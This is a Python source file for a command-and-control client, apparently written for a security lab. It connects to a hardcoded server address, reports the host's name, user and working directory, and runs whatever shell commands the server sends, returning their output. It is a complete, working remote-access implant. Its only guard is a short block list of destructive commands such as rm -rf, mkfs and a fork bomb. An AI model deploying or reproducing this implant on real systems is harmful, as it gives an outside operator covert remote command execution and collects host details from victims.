#!/usr/bin/env python3
"""
Malformed Labs C2 Client
Basic Command and Control Client for Lab Environment
"""

import socket
import json
import time
import threading
import subprocess
import platform
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class C2Client:
    def __init__(self, server_host='192.168.210.13', server_port=8888):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.client_id = None
        
        # Authentication token (must match server)
        self.auth_token = "malformed_labs_c2_2024"
        
        # Client information
        self.client_info = self.get_system_info()
        
    def get_system_info(self):
        """Gather system information"""
        try:
            return {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor() or 'Unknown',
                'python_version': platform.python_version(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'Unknown',
                'cwd': os.getcwd()
            }
        except Exception as e:
            logger.error(f"Error gathering system info: {e}")
            return {'error': str(e)}
    
    def connect(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            logger.info(f"Connected to C2 server at {self.server_host}:{self.server_port}")
            
            # Receive handshake
            handshake = self.receive_message()
            if handshake and handshake.get('type') == 'handshake':
                logger.info(f"Server: {handshake.get('message')}")
                
                # Send authentication
                auth_message = {
                    'type': 'auth',
                    'token': self.auth_token,
                    'info': self.client_info,
                    'timestamp': datetime.now().isoformat()
                }
                self.send_message(auth_message)
                
                # Wait for auth response
                auth_response = self.receive_message()
                if auth_response and auth_response.get('type') == 'auth_success':
                    self.client_id = auth_response.get('client_id')
                    logger.info(f"Authentication successful. Client ID: {self.client_id}")
                    return True
                else:
                    logger.error("Authentication failed")
                    return False
            else:
                logger.error("Invalid handshake from server")
                return False
                
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def send_message(self, message):
        """Send JSON message to server"""
        try:
            data = json.dumps(message).encode('utf-8')
            length = len(data)
            self.socket.send(length.to_bytes(4, 'big'))
            self.socket.send(data)
        except Exception as e:
            logger.error(f"Send message error: {e}")
    
    def receive_message(self):
        """Receive JSON message from server"""
        try:
            # Receive message length
            length_bytes = self.socket.recv(4)
            if len(length_bytes) != 4:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Receive message data
            data = b''
            while len(data) < length:
                chunk = self.socket.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            
            return json.loads(data.decode('utf-8'))
        except Exception as e:
            logger.error(f"Receive message error: {e}")
            return None
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            logger.info(f"Executing command: {command}")
            
            # Basic command filtering for safety
            blocked_commands = ['rm -rf', 'mkfs', 'dd if=', 'format', ':(){:|:&};:']
            if any(blocked in command.lower() for blocked in blocked_commands):
                return False, "Command blocked for safety"
            
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30  # 30 second timeout
            )
            
            output = result.stdout + result.stderr
            success = result.returncode == 0
            
            return success, output
            
        except subprocess.TimeoutExpired:
            return False, "Command timed out (30s limit)"
        except Exception as e:
            return False, f"Execution error: {str(e)}"
    
    def process_server_message(self, message):
        """Process incoming message from server"""
        msg_type = message.get('type')
        
        if msg_type == 'heartbeat':
            # Respond to heartbeat
            response = {
                'type': 'heartbeat',
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
            
        elif msg_type == 'command':
            # Execute command
            command = message.get('command', '')
            success, result = self.execute_command(command)
            
            # Send result back to server
            response = {
                'type': 'command_result',
                'command': command,
                'success': success,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
            
        elif msg_type == 'info_request':
            # Send updated system info
            response = {
                'type': 'info_update',
                'info': self.get_system_info(),
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
            
        else:
            logger.warning(f"Unknown message type: {msg_type}")
    
    def heartbeat_loop(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'timestamp': datetime.now().isoformat()
                }
                self.send_message(heartbeat)
                time.sleep(30)  # Send heartbeat every 30 seconds
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
                break
    
    def run(self):
        """Main client loop"""
        if not self.connect():
            return
        
        self.running = True
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        logger.info("Client running. Listening for commands...")
        
        try:
            while self.running:
                message = self.receive_message()
                if not message:
                    logger.warning("Lost connection to server")
                    break
                
                self.process_server_message(message)
                
        except KeyboardInterrupt:
            logger.info("Client interrupted by user")
        except Exception as e:
            logger.error(f"Client error: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the client"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        logger.info("Client stopped")

def main():
    # Parse command line arguments
    server_host = sys.argv[1] if len(sys.argv) > 1 else '192.168.210.13'
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8888
    
    print("=== Malformed Labs C2 Client ===")
    print(f"Connecting to: {server_host}:{server_port}")
    print("Press Ctrl+C to stop\n")
    
    client = C2Client(server_host, server_port)
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down client...")
        client.stop()
    
    print("Client shutdown complete.")

if __name__ == "__main__":
    main()